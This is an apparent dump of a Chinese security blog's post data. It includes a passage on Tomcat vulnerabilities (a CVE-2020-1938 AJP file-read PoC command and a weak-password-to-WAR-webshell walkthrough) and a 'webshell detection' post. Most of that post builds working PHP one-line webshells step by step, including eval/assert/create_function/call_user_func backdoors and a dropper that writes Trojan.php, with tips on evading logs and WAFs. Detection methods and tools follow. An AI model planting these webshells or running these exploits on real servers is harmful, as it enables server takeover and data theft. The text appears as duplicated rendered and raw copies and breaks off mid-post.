alt=\"image-20200813134428832\"></p>\n<h5 id=\"漏洞修复-1\"><a href=\"#漏洞修复-1\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、删除web.xml文件中readonly属性的值为true或直接删除</p>\n<p>2、更新至官方最新</p>\n<h4 id=\"CVE-2020-1938\"><a href=\"#CVE-2020-1938\" class=\"headerlink\" title=\"CVE-2020-1938\"></a>CVE-2020-1938</h4><h5 id=\"漏洞描述-2\"><a href=\"#漏洞描述-2\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>CVE-2020-1938是由于Apache Tomcat服务器存在文件包含漏洞，攻击者可利用该漏洞读取或包含 Tomcat 上所有 webapp 目录下的任意文件，如：webapp 配置文件或源代码等。</p>\n<p>由于Tomcat默认开启的AJP服务（8009端口）存在一处文件包含缺陷，攻击者可构造恶意的请求包进行文件包含操作，进而读取受影响Tomcat服务器上的Web目录文件。</p>\n<h5 id=\"影响范围-2\"><a href=\"#影响范围-2\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h5><p>Apache Tomcat 6</p>\n<p>Apache Tomcat 7 &lt; 7.0.100</p>\n<p>Apache Tomcat 8 &lt; 8.5.51</p>\n<p>Apache Tomcat 9 &lt; 9.0.31</p>\n<h5 id=\"漏洞原理-2\"><a href=\"#漏洞原理-2\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h5><p>由于Tomcat默认开启的AJP服务（8009端口）存在一处文件包含缺陷，攻击者可构造恶意的请求包进行文件包含操作，进而读取受影响Tomcat服务器上的Web目录文件。</p>\n<h5 id=\"漏洞条件-2\"><a href=\"#漏洞条件-2\" class=\"headerlink\" title=\"漏洞条件\"></a>漏洞条件</h5><p>无条件（漏洞环境<a href=\"https://github.com/0nise/CVE-2020-1938\">参考</a>zip解压并执行）</p>\n<h5 id=\"漏洞检测-2\"><a href=\"#漏洞检测-2\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h5><p>1、URL访问</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;192.168.3.167:8080&#x2F;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tomcat/image-20200813153350723.png\" alt=\"image-20200813153350723\"></p>\n<p>2、端口号检测</p>\n<p><img src=\"/images/tomcat/image-20200813153640165.png\" alt=\"image-20200813153640165\"></p>\n<p>由上可以知道目标主机开放8009端口号。</p>\n<p>3、PoC读取文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.3.167 -p 8009 -f WEB-INF&#x2F;web.xml</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tomcat/image-20200813153702055.png\" alt=\"image-20200813153702055\"></p>\n<h5 id=\"漏洞修复-2\"><a href=\"#漏洞修复-2\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、下载最新</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;tomcat.apache.org&#x2F;download-70.cgi</span><br><span class=\"line\">https:&#x2F;&#x2F;tomcat.apache.org&#x2F;download-80.cgi</span><br><span class=\"line\">https:&#x2F;&#x2F;tomcat.apache.org&#x2F;download-90.cgi</span><br><span class=\"line\">https:&#x2F;&#x2F;github.com&#x2F;apache&#x2F;tomcat&#x2F;releases</span><br></pre></td></tr></table></figure>\n\n<p>2、临时禁用AJP协议端口，</p>\n<p>在conf/server.xml</p>\n<p><code>注释此行&lt;Connector port=&quot;8009&quot; protocol=&quot;AJP/1.3&quot;redirectPort=&quot;8443&quot; /&gt;</code></p>\n<p><img src=\"/images/tomcat/image-20200813154014736.png\" alt=\"image-20200813154014736\"></p>\n<h4 id=\"Weak-password\"><a href=\"#Weak-password\" class=\"headerlink\" title=\"Weak password\"></a>Weak password</h4><h5 id=\"漏洞描述-3\"><a href=\"#漏洞描述-3\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>弱口令属于常见漏洞，也是在漏洞挖掘时一个很好的突破口；而tomcat如果存在弱口令，那将会影响系统被攻击者获取系统权限。</p>\n<h5 id=\"影响范围-3\"><a href=\"#影响范围-3\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h5><p>所有版本</p>\n<h5 id=\"漏洞原理-3\"><a href=\"#漏洞原理-3\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h5><p>口令设置较弱，可直接爆破。</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">conf/tomcat-users.xml(添加一行即可)</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">user</span> <span class=\"attr\">username</span>=<span class=\"string\">&quot;tomcat&quot;</span> <span class=\"attr\">password</span>=<span class=\"string\">&quot;tomcat&quot;</span> <span class=\"attr\">roles</span>=<span class=\"string\">&quot;manager-status,manager-gui,manager-script,manager-jmx&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"漏洞条件-3\"><a href=\"#漏洞条件-3\" class=\"headerlink\" title=\"漏洞条件\"></a>漏洞条件</h5><p>无条件</p>\n<h5 id=\"漏洞检测-3\"><a href=\"#漏洞检测-3\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h5><p>1、URL访问</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;192.168.3.167:8080&#x2F;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tomcat/image-20200813163502206.png\" alt=\"image-20200813163502206\"></p>\n<p>2、点击“Server Status”</p>\n<p><img src=\"/images/tomcat/image-20200813163542988.png\" alt=\"image-20200813163542988\"></p>\n<p>3、尝试爆破</p>\n<p><a href=\"https://github.com/magicming200/tomcat-weak-password-scanner\">脚本</a></p>\n<p><img src=\"/images/tomcat/image-20200813163718308.png\" alt=\"image-20200813163718308\"></p>\n<p>4、生成war包</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  server jar -cvf  shell.war shell.jsp</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tomcat/image-20200813163839974.png\" alt=\"image-20200813163839974\"></p>\n<p>5、部署war包</p>\n<p><img src=\"/images/tomcat/image-20200813164753751.png\" alt=\"image-20200813164753751\"></p>\n<p>6、访问</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;192.168.3.167:8080&#x2F;shell&#x2F;shell.jsp</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tomcat/image-20200813164812341.png\" alt=\"image-20200813164812341\"></p>\n<p><img src=\"/images/tomcat/image-20200813164838466.png\" alt=\"image-20200813164838466\"></p>\n<h5 id=\"漏洞修复-3\"><a href=\"#漏洞修复-3\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、设置强壮密码</p>\n<p>2、平时不用，不允许登录</p>\n<h3 id=\"Tools\"><a href=\"#Tools\" class=\"headerlink\" title=\"Tools\"></a>Tools</h3><p><a href=\"https://github.com/si1ent-le/vuln-all/tree/master/Tomcat_vuln/weakpassword/tomcat_weakpassword_brute\">Weak_password_brute</a></p>\n<p><a href=\"https://github.com/si1ent-le/vuln-all/blob/master/Tomcat_vuln/CVE-2020-1938/CNVD-2020-10487-Tomcat-Ajp-lfi.py\">CVE-2020-1938</a></p>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;tree&#x2F;master&#x2F;tomcat</span><br><span class=\"line\">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;5610</span><br><span class=\"line\">https:&#x2F;&#x2F;github.com&#x2F;0nise&#x2F;CVE-2020-1938</span><br></pre></td></tr></table></figure>\n\n"},{"title":"Unvalidated_Redirects_and_Forwards","date":"2019-09-27T05:39:09.000Z","_content":"参考如下整理的思维导图😄,后续会跟进以下环境测试结果情况.\n![](/images/redict_url/url_redirect.gif)\n\n### Start\n快到碗里来\n\n[Open&Redirect&Forwards](http://www.si1ent.xyz/ziliao/Unvalidated&Redirect&Forwards.pdf)\n\n","source":"_posts/Unvalidated-Redirects-and-Forwards.md","raw":"---\ntitle: Unvalidated_Redirects_and_Forwards\ndate: 2019-09-027 13:39:09\ntags:\n - 重定向\n---\n参考如下整理的思维导图😄,后续会跟进以下环境测试结果情况.\n![](/images/redict_url/url_redirect.gif)\n\n### Start\n快到碗里来\n\n[Open&Redirect&Forwards](http://www.si1ent.xyz/ziliao/Unvalidated&Redirect&Forwards.pdf)\n\n","slug":"Unvalidated-Redirects-and-Forwards","published":1,"updated":"2020-10-23T03:39:29.573Z","_id":"ckglobhdv000lb1hq8ti2hanx","comments":1,"layout":"post","photos":[],"link":"","content":"<p>参考如下整理的思维导图😄,后续会跟进以下环境测试结果情况.<br><img src=\"/images/redict_url/url_redirect.gif\"></p>\n<h3 id=\"Start\"><a href=\"#Start\" class=\"headerlink\" title=\"Start\"></a>Start</h3><p>快到碗里来</p>\n<p><a href=\"http://www.si1ent.xyz/ziliao/Unvalidated&Redirect&Forwards.pdf\">Open&amp;Redirect&amp;Forwards</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>参考如下整理的思维导图😄,后续会跟进以下环境测试结果情况.<br><img src=\"/images/redict_url/url_redirect.gif\"></p>\n<h3 id=\"Start\"><a href=\"#Start\" class=\"headerlink\" title=\"Start\"></a>Start</h3><p>快到碗里来</p>\n<p><a href=\"http://www.si1ent.xyz/ziliao/Unvalidated&Redirect&Forwards.pdf\">Open&amp;Redirect&amp;Forwards</a></p>\n"},{"title":"Webshell检测","date":"2020-09-11T08:57:27.000Z","_content":"#### 概述\n\nWeb：指的是在Web服务器，而shell是用脚本语言编写的脚本程序，Webshell就是就是Web的一个管理工具，可以对Web服务器进行操作的权限，也叫webadmin。\n\nWebshell一般是被网站管理员用于网站管理、服务器管理等等一些用途，但是由于webshell的功能比较强大，可以上传下载文件，查看数据库，甚至可以调用一些服务器上系统的相关命令（比如创建用户，修改删除文件之类的），通常被黑客利用，黑客通过一些上传方式，将自己编写的webshell上传到Web服务器的页面的目录下，然后通过页面访问的形式进行入侵，或者通过插入一句话连接本地的一些相关工具直接对服务器进行入侵操作。\n\n#### 分类\n\n##### 编程语言\n\nWebshell根据编程语言可以分为：\n\n```\nPHP木马\nASP木马\n.NET木马\nJSP木马\npython动态网页\n```\n\n##### 功能\n\n根据功能分为`大马`、`小马`、`打包马`、`脱裤马`；\n\n小马通常指的一句话木马，体积较小，例如：`<%eval request(“pass”)%>`通常把这句话写入一个文档里面，然后修改xx.asp或php后缀。然后上传至服务器上。eval方法将request(“pass”)转换成代码执行，request函数的作用是应用外部文件。这相当于一句话木马的客户端配置。\n\n大马通常体积比较大 一般50K以上。功能也多，一般都包括提权命令，磁盘管理，数据库连接借口，执行命令甚至有些以具备自带提权功能和压缩，解压缩网站程序的功能。这种马隐蔽性不好，而大多代码如不加密的话很多杀毒厂商开始追杀此类程序。\n\n#### 常用函数\n\n由以上Webshell功能介绍了解到，它们使用各编程语编写并上传到目标服务器上执行；尝试获取系统命令、及网站web权限。因此需要使用对应编程语言内系统函数。\n\n（PHP语言示例）\n\n##### system\n\n函数将命令作为参数，并输出结果。\n\n```php+HTML\n<?php\neval(system('date'));\n?>\n```\n\n![image-20200910191501727](/images/webshell/image-20200910191501727.png)\n\n PHP 中的`超全局变量`(如`$_GET`、`$_POST`、`$_REQUEST`、`$_COOKIE`）获取攻击者的指令输入。\n\n```php+HTML\n<?php\n//eval(system('date'));\n$tmp='system(\"'.$_GET[cmd].'\");';\neval($tmp);\n\n?>\n```\n\n![image-20200910192925561](/images/webshell/image-20200910192925561.png)\n\n这里还有点问题：\n\n1. 使用了超全局变量 `$_GET` 来通过 get 方法获取用户的输入命令。但是 GET 方法有一些限制，第一是存在长度限制：特定的浏览器及服务器会对通过 get 方法提交的字符串有一定的限制。第二是当网站管理员查 log 的时候，会看到明文的 get 请求参数，容易被发现，相比之下， post 请求敏感内容不容易被发现。所以最好把 get 方法换成 post 方法。\n2. system 函数不应该被写进去。一方面是因为因为有时候 php 中的一些危险函数会被开发者或者网站管理人员禁用，我们可以先不写命令执行函数，攻击的时候可以自行选择更厉害的方法进行绕过。另一方面是写入了 system 这个一句话木马就只能执行命令了，但是不写的话通过使用不同的 payload 一个一句话木马其实啥都能做（就像一句话木马连上菜刀之后的功能），基本跟大马一样。\n3. 在 eval 前面可以加一个 `@`，@是忽略可能出现的错误。\n\n因此最后形成的一句话木马：\n\n```php+HTML\n<?php\n//eval(system('date'));\n//$tmp='system(\"'.$_GET[cmd].'\");';\n//eval($tmp);\n@eval($_POST[cmd]);\n?>\n```\n\n![image-20200910201443491](/images/webshell/image-20200910201443491.png)\n\n##### assert\n\nassert 这个函数在 php 语言中是用来判断一个表达式是否成立。返回 true or false；assert 函数的参数会被执行，这跟 eval() 类似。\n\n```php+HTML\n<?php\n//eval(system('date'));\n//$tmp='system(\"'.$_GET[cmd].'\");';\n//eval($tmp);\n//@eval($_POST[cmd]);\nassert(system(\"date\"));\n?>\n```\n\n![image-20200910202300583](/images/webshell/image-20200910202300583.png)\n\n```php+HTML\n//post型\n<?php\n@assert($_POST['c']);\n?>\n```\n\n```\n给 assert() 函数传入字符串参数，这个特性在 7.2 禁用，在 8.0 版本时会被彻底删除。\n```\n\n注意：我们对一句话木马使用的一些 payload，比如 phpinfo() 或者 system(‘command’)，因为不是字符串，所以也就不受版本限制。\n\n如下所示：\n\n```php+HTML\n<?php\n//eval(system('date'));\n//$tmp='system(\"'.$_GET[cmd].'\");';\n//eval($tmp);\n//@eval($_POST[cmd]);\n//assert(system(\"date\"));\nassert($_GET['cmd']);\n?>\n```\n\n![image-20200910202837253](/images/webshell/image-20200910202837253.png)\n\n##### create_function\n\n在php中，函数`create_function`主要用来创建匿名函数。\n\n```php+HTML\nstring create_function(string $args, string $code)\nstring $args 变量部分\nstring $code 方法代码部分\n```\n\n注意当我们使用此匿名函数的时候，方法代码部分会被执行。\n\n```php+HTML\n<?php\n//eval(system('date'));\n//$tmp='system(\"'.$_GET[cmd].'\");';\n//eval($tmp);\n//@eval($_POST[cmd]);\n//assert(system(\"date\"));\n//assert($_GET['cmd']);\n$tmp = create_function('',system('date'));\n$tmp();\n?>\n```\n\n![image-20200910203507277](/images/webshell/image-20200910203507277.png)\n\n\n\n构造一句话木马\n\n```php+HTML\n<?php\n$tmp = create_function('',$_POST['cmd']);\n$tmp();\n?>\n```\n\n把用户传递的数据生成一个函数 tmp()，然后再执行 tmp()：\n\n![image-20200910203732113](/images/webshell/image-20200910203732113.png)\n\n##### call_user_func\n\n`call_user_func` 这个函数可以调用其它函数，被调用的函数是 `call_user_func` 的第一个函数，被调用的函数的参数是 `call_user_func` 的第二个参数。这样的一个语句也可以完成一句话木马。一些被 waf 拦截的木马可以配合这个函数绕过 waf。\n\n```php+HTML\n<?php\n//eval(system('date'));\n//$tmp='system(\"'.$_GET[cmd].'\");';\n//eval($tmp);\n//@eval($_POST[cmd]);\n//assert(system(\"date\"));\n//assert($_GET['cmd']);\n//$tmp = create_function('',system('date'));\n//$tmp();\n\n//$tmp = create_function('',$_POST['cmd']);\n//$tmp();\n\ncall_user_func(system(\"date\"));\n\n?>\n```\n\n![image-20200910205446756](/images/webshell/image-20200910205446756.png)\n\n其实所有的一句话木马都由两部分组成：\n\n1. 接收攻击者输入\n2. 命令执行函数\n\n在`PHP Version 7.3.4`，webshell 是无法回显的.\n\n```php+HTML\n<?php\n//eval(system('date'));\n//$tmp='system(\"'.$_GET[cmd].'\");';\n//eval($tmp);\n//@eval($_POST[cmd]);\n//assert(system(\"date\"));\n//assert($_GET['cmd']);\n//$tmp = create_function('',system('date'));\n//$tmp();\n\n//$tmp = create_function('',$_POST['cmd']);\n//$tmp();\n\n//call_user_func(system(\"date\"));\ncall_user_func(assert,$_POST['cmd']);\n//@call_user_func(assert,phpinfo());\n\n?>\n```\n\n如下图所示显示为空\n\n![image-20200910210011420](/images/webshell/image-20200910210011420.png)\n\n绕过\n\n```php+HTML\n<?php\n//eval(system('date'));\n//$tmp='system(\"'.$_GET[cmd].'\");';\n//eval($tmp);\n//@eval($_POST[cmd]);\n//assert(system(\"date\"));\n//assert($_GET['cmd']);\n//$tmp = create_function('',system('date'));\n//$tmp();\n\n//$tmp = create_function('',$_POST['cmd']);\n//$tmp();\n\n//call_user_func(system(\"date\"));\n//call_user_func(assert,$_POST['cmd']);\n@call_user_func(assert,phpinfo());\n\n?>\n```\n\n![image-20200910210301627](/images/webshell/image-20200910210301627.png)\n\n\n\n由以上`assert()`函数介绍，给 assert() 函数传入字符串参数，这个特性在 7.2 禁用。\n\n因为通过超全局常量 `$_GET['']`获取的攻击者输入是字符串，这样传入assert函数就触发了禁用。\n\n但是直接`assert(phpinfo())`传入的参数是函数，所以就不会触发函数禁用，可以正常回显。\n\n此时更换PHP版本为`7.0.33`如下图所示可以显示。\n\n```php+HTML\n<?php\n//eval(system('date'));\n//$tmp='system(\"'.$_GET[cmd].'\");';\n//eval($tmp);\n//@eval($_POST[cmd]);\n//assert(system(\"date\"));\n//assert($_GET['cmd']);\n//$tmp = create_function('',system('date'));\n//$tmp();\n\n//$tmp = create_function('',$_POST['cmd']);\n//$tmp();\n\n//call_user_func(system(\"date\"));\n//call_user_func(assert,$_POST['cmd']);\n//@call_user_func(assert,phpinfo());\n\n@call_user_func(assert,$_GET['cmd']);\n?>\n```\n\n![image-20200911104416978](/images/webshell/image-20200911104416978.png)\n\n更换7.1.20尝试，无法显示phpinfo信息\n\n![image-20200911104522817](/images/webshell/image-20200911104522817.png)\n\n这个禁用特性其实是从 php 7.1 版本开始，所以 `call_user_func + assert` 构造的一句话木马在 php 7.0 版本及以下可以使用。\n\n##### preg_replace_callback\n\n `preg_replace /e` 函数写 webshell，因为此函数5.5.0及以上版本已经被弃用了。使用 preg_replace_callback() 代替。\n\n```php+HTML\n<?php\n//eval(system('date'));\n//$tmp='system(\"'.$_GET[cmd].'\");';\n//eval($tmp);\n//@eval($_POST[cmd]);\n//assert(system(\"date\"));\n//assert($_GET['cmd']);\n//$tmp = create_function('',system('date'));\n//$tmp();\n\n//$tmp = create_function('',$_POST['cmd']);\n//$tmp();\n\n//call_user_func(system(\"date\"));\n//call_user_func(assert,$_POST['cmd']);\n//@call_user_func(assert,phpinfo());\n\n//@call_user_func(assert,$_GET['cmd']);\n\npreg_replace_callback('/.+/i', create_function('$arr', 'return assert($arr[0]);'), $_REQUEST['cmd']);\n\n?>\n```\n\n此 webshell 的原理为：通过 `create_function` “创造”一个函数，它接受一个数组，并将数组的第一个元素$arr[0]传入assert。\n\n![image-20200911105751006](/images/webshell/image-20200911105751006.png)\n\n##### file_put_contents\n\nwebshell 调试三部曲：\n\n1. 把函数写在 php 文件中，看能否执行\n2. 写成 `$_GET['']` 方式传入命令，看能否执行\n3. 写成 `$_POST['']`方式传入命令，能能否执行命令\n   `注：`2、3步可以合成通过`$_REQUEST['']`方法传入命令。\n\n```php+HTML\n<?php\n//eval(system('date'));\n//$tmp='system(\"'.$_GET[cmd].'\");';\n//eval($tmp);\n//@eval($_POST[cmd]);\n//assert(system(\"date\"));\n//assert($_GET['cmd']);\n//$tmp = create_function('',system('date'));\n//$tmp();\n\n//$tmp = create_function('',$_POST['cmd']);\n//$tmp();\n\n//call_user_func(system(\"date\"));\n//call_user_func(assert,$_POST['cmd']);\n//@call_user_func(assert,phpinfo());\n\n//@call_user_func(assert,$_GET['cmd']);\n\n//preg_replace_callback('/.+/i', create_function('$arr', 'return assert($arr[0]);'), $_REQUEST['cmd']);\n\n$test='<?php $a=$_POST[\"cmd\"];assert($a); ?>';\nfile_put_contents(\"Trojan.php\", $test);\n?>\n```\n\n上面这个 webshell 利用函数生成 `Trojan.php` 木马文件。\n`file_put_contents` 函数：生成一个文件。第一个参数是文件名，第二个参数是文件的内容。\n\n![image-20200911110201716](/images/webshell/image-20200911110201716.png)\n\n![image-20200911110325971](/images/webshell/image-20200911110325971.png)\n\n如上图所示：命令成功执行\n\n##### exec\n\nexec()功能是将命令作为参数，但不输出结果。如果指定了第二个可选参数，则返回结果为数组。否则，如果回显，只显示结果的最后一行。\n\n```php+HTML\n<?php\nexec(\"ls\")\n//echo exec(\"ls\");\n?>\n```\n\n无法回显，使用`exec()`函数执行echo命令，只会输出最后一行命令结果。\n\n```php+HTML\n<?php\n//exec(\"ls\")\necho exec(\"ls\");\n?>\n```\n\n![image-20200911111810853](/images/webshell/image-20200911111810853.png)\n\n如果指定了第二个参数，则返回结果为数组。\n\n```php+HTML\n<?php\n//exec(\"ls\")\nexec(\"ls\",$array);\nprint_r($array);\n?>\n```\n\n\n\n![image-20200911111954897](/images/webshell/image-20200911111954897.png)\n\n##### shell_exec\n\nshell_exec()函数类似于exec()，但是，其整个输出结果为字符串。\n\n```php+HTML\n<?php\necho shell_exec(\"ls -al\");\n?>\n```\n\n![image-20200911112228548](/images/webshell/image-20200911112228548.png)\n\n##### passthru\n\npassthru()执行一个命令并返回原始格式的输出.\n\n```php+HTML\n<?php\npassthru(\"ls -l\");\n?>\n```\n\n![image-20200911112637207](/images/webshell/image-20200911112637207.png)\n\n#### 检测手段\n\n##### 静态检测\n\n攻击者入侵服务器，使用Webshell，不管是传文件还是改文件，必然有一个文件会包含webshell代码，很容易想到从文件代码入手，这是静态特征检测。\n\n静态检测通过匹配特征码，特征值，危险函数函数来查找webshell的方法，只能查找已知的webshell，且误报、漏报率会比较高，但如果规则完善，可以减低误报率，但是漏报率必定会有所提高。优点是快速方便，对已知的webshell查找准确率高，部署方便，一个脚本就能搞定。\n\n缺点漏报率、误报率高，无法查找0day型webshell，而且容易被绕过。对于单站点的网站，用静态检测还是有很大好处，配合人工，能快速定位webshell，但是如果是一个成千上万站点的大型企业呢，这个时候再人肉那工作量可就大了。\n\n因此用这样一种思路：强弱特征。即把特征码分为强弱两种特征，强特征命中则必是webshell；弱特征由人工去判断。加入一种强特征，即把流行webshell用到的特征作为强特征重点监控，一旦出现这样的特征即可确认为webshell立即进行响应。要解决误报和漏报，就不能拘泥于代码级别了。\n\n同时结合文件系统。结合文件的属性来判断，比如apache是noboy启动的，webshell的属主必然也是nobody，如果我的Web目录无缘无故多了个nobody属主的文件，这里就有问题了。最理想的办法是需要制度和流程来建设一个web目录唯一发布入口，控制住这个入口，非法进来的Web文件自然可以发现。\n\n##### 动态检测\n\nWebshell运行后，B/S数据通过HTTP交互，HTTP请求/响应中可以找到蛛丝马迹，这是动态特征检测。\n\nWebshell传到服务器了，总要去执行它，Webshell执行时刻表现出来的特征，我们称为动态特征。Webshell通信是HTTP协议。只要我们把Webshell特有的HTTP请求/响应做成特征库，加到IDS里面去检测所有的HTTP请求就好了。\n\nwebshell起来如果执行系统命令的话，会有进程。Linux下就是nobody用户起了bash，Win下就是IIS User启动cmd，这些都是动态特征。\n\n##### 日志检测\n\n访问Webshell一般不会在系统日志中留下记录，但是会在网站的`web日志`中留下Webshell页面的访问数据和数据提交记录。日志分析检测技术通过大量的日志文件建立请求模型从而检测出异常文件，称之为：HTTP异常请求模型检测。\n\n例如：一个平时是GET的请求改用POST请求并且返回代码为200、某个页面的访问者IP、访问时间具有规律性等。\n\n#### Tools\n\n以上介绍了部分检测手段，当然也少不了一些自动化工具(如下)，但是还需人工协助实现对Webshell检测的误报率。\n\n[findWebshell](https://github.com/he1m4n6a/findWebshell)\n\n一款本地检测Webshell工具，基本Webshell均可检测。可down到本地测试。检测脚本使用python编写。\n\n[D盾](http://www.d99net.net/News.asp?id=47)\n\n一款Windows客户端检测Webshell检测工具。较多人使用，具体使用下载本地测试即可。\n\n[河马](https://www.shellpub.com/)\n\n官网介绍：专注webshell查杀研究。拥有海量webshell样本和自主查杀技术，采用传统特征+云端大数据双引擎的查杀技术。查杀速度快、精度高、误报低。\n\n[安全狗](http://www.safedog.cn/)\n\n网站、服务器的检测，同时可以支持安全攻击防御，webshell检测等功能。\n\n#### Referer\n\n```\nhttps://www.jianshu.com/p/02aac12e459f\nhttp://blog.leanote.com/post/snowming/2e1ab18dfa80\nhttps://www.cnblogs.com/he1m4n6a/p/9245155.html\n```\n\n","source":"_posts/Webshell检测.md","raw":"---\ntitle: Webshell检测\ndate: 2020-9-11 16:57:27\ntags:\n - Webshell\n---\n#### 概述\n\nWeb：指的是在Web服务器，而shell是用脚本语言编写的脚本程序，Webshell就是就是Web的一个管理工具，可以对Web服务器进行操作的权限，也叫webadmin。\n\nWebshell一般是被网站管理员用于网站管理、服务器管理等等一些用途，但是由于webshell的功能比较强大，可以上传下载文件，查看数据库，甚至可以调用一些服务器上系统的相关命令（比如创建用户，修改删除文件之类的），通常被黑客利用，黑客通过一些上传方式，将自己编写的webshell上传到Web服务器的页面的目录下，然后通过页面访问的形式进行入侵，或者通过插入一句话连接本地的一些相关工具直接对服务器进行入侵操作。\n\n#### 分类\n\n##### 编程语言\n\nWebshell根据编程语言可以分为：\n\n```\nPHP木马\nASP木马\n.NET木马\nJSP木马\npython动态网页\n```\n\n##### 功能\n\n根据功能分为`大马`、`小马`、`打包马`、`脱裤马`；\n\n小马通常指的一句话木马，体积较小，例如：`<%eval request(“pass”)%>`通常把这句话写入一个文档里面，然后修改xx.asp或php后缀。然后上传至服务器上。eval方法将request(“pass”)转换成代码执行，request函数的作用是应用外部文件。这相当于一句话木马的客户端配置。\n\n大马通常体积比较大 一般50K以上。功能也多，一般都包括提权命令，磁盘管理，数据库连接借口，执行命令甚至有些以具备自带提权功能和压缩，解压缩网站程序的功能。这种马隐蔽性不好，而大多代码如不加密的话很多杀毒厂商开始追杀此类程序。\n\n#### 常用函数\n\n由以上Webshell功能介绍了解到，它们使用各编程语编写并上传到目标服务器上执行；尝试获取系统命令、及网站web权限。因此需要使用对应编程语言内系统函数。\n\n（PHP语言示例）\n\n##### system\n\n函数将命令作为参数，并输出结果。\n\n```php+HTML\n<?php\neval(system('date'));\n?>\n```\n\n![image-20200910191501727](/images/webshell/image-20200910191501727.png)\n\n PHP 中的`超全局变量`(如`$_GET`、`$_POST`、`$_REQUEST`、`$_COOKIE`）获取攻击者的指令输入。\n\n```php+HTML\n<?php\n//eval(system('date'));\n$tmp='system(\"'.$_GET[cmd].'\");';\neval($tmp);\n\n?>\n```\n\n![image-20200910192925561](/images/webshell/image-20200910192925561.png)\n\n这里还有点问题：\n\n1. 使用了超全局变量 `$_GET` 来通过 get 方法获取用户的输入命令。但是 GET 方法有一些限制，第一是存在长度限制：特定的浏览器及服务器会对通过 get 方法提交的字符串有一定的限制。第二是当网站管理员查 log 的时候，会看到明文的 get 请求参数，容易被发现，相比之下， post 请求敏感内容不容易被发现。所以最好把 get 方法换成 post 方法。\n2. system 函数不应该被写进去。一方面是因为因为有时候 php 中的一些危险函数会被开发者或者网站管理人员禁用，我们可以先不写命令执行函数，攻击的时候可以自行选择更厉害的方法进行绕过。另一方面是写入了 system 这个一句话木马就只能执行命令了，但是不写的话通过使用不同的 payload 一个一句话木马其实啥都能做（就像一句话木马连上菜刀之后的功能），基本跟大马一样。\n3. 在 eval 前面可以加一个 `@`，@是忽略可能出现的错误。\n\n因此最后形成的一句话木马：\n\n```php+HTML\n<?php\n//eval(system('date'));\n//$tmp='system(\"'.$_GET[cmd].'\");';\n//eval($tmp);\n@eval($_POST[cmd]);\n?>\n```\n\n![image-20200910201443491](/images/webshell/image-20200910201443491.png)\n\n##### assert\n\nassert 这个函数在 php 语言中是用来判断一个表达式是否成立。返回 true or false；assert 函数的参数会被执行，这跟 eval() 类似。\n\n```php+HTML\n<?php\n//eval(system('date'));\n//$tmp='system(\"'.$_GET[cmd].'\");';\n//eval($tmp);\n//@eval($_POST[cmd]);\nassert(system(\"date\"));\n?>\n```\n\n![image-20200910202300583](/images/webshell/image-20200910202300583.png)\n\n```php+HTML\n//post型\n<?php\n@assert($_POST['c']);\n?>\n```\n\n```\n给 assert() 函数传入字符串参数，这个特性在 7.2 禁用，在 8.0 版本时会被彻底删除。\n```\n\n注意：我们对一句话木马使用的一些 payload，比如 phpinfo() 或者 system(‘command’)，因为不是字符串，所以也就不受版本限制。\n\n如下所示：\n\n```php+HTML\n<?php\n//eval(system('date'));\n//$tmp='system(\"'.$_GET[cmd].'\");';\n//eval($tmp);\n//@eval($_POST[cmd]);\n//assert(system(\"date\"));\nassert($_GET['cmd']);\n?>\n```\n\n![image-20200910202837253](/images/webshell/image-20200910202837253.png)\n\n##### create_function\n\n在php中，函数`create_function`主要用来创建匿名函数。\n\n```php+HTML\nstring create_function(string $args, string $code)\nstring $args 变量部分\nstring $code 